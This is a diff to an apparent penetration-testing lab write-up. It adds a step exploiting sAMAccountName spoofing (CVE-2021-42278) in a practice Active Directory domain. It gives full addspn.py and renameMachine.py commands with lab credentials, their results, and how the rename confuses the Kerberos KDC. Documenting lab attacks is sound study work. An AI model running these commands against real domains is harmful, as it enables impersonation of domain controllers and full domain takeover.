@@ -31,3 +31,16 @@ Command: python3 addspn.py --clear -t 'SYSKEY$' -u 'north.sevenkingdoms.local\jo
 Action: Successfully connected to the host and cleared the servicePrincipalName attribute for CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local.
 
 Impact: Clearing these attributes ensures that the machine account is in a "clean" state before the attacker attempts to configure it for impersonation against a target service.
+<img width="1778" height="207" alt="image" src="https://github.com/user-attachments/assets/4e69b3bf-05de-45a3-a531-81ebe6b020da" />
+
+### 4. 4. Machine Account Renaming (CVE-2021-42278)
+After successfully creating the SYSKEY$ machine account, the attacker leveraged the renameMachine.py script to exploit the sAMAccountName Spoofing vulnerability. By removing the trailing $ and renaming the account to match the Domain Controller's hostname (winterfell), the attacker prepares to trick the Key Distribution Center (KDC) during the Kerberos ticket request phase.
+
+Command: python3 renameMachine.py -current-name 'SYSKEY$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
+
+Action: Successfully modified the sAMAccountName attribute of the object CN=SYSKEY,CN=Computers,DC=north,DC=sevenkingdoms,DC=local from SYSKEY$ to winterfell.
+
+Technical Vulnerability: This exploits a lack of validation where the KDC can be confused between a machine account renamed to a non-standard name and the actual Domain Controller's identity when processing TGT and TGS requests.
+
+📸 Evidence: Machine Renaming (CVE-2021-42278 Execution)
+<img width="1919" height="177" alt="image" src="https://github.com/user-attachments/assets/2f6cfac2-06e3-492a-bfe3-b557573f4864" />
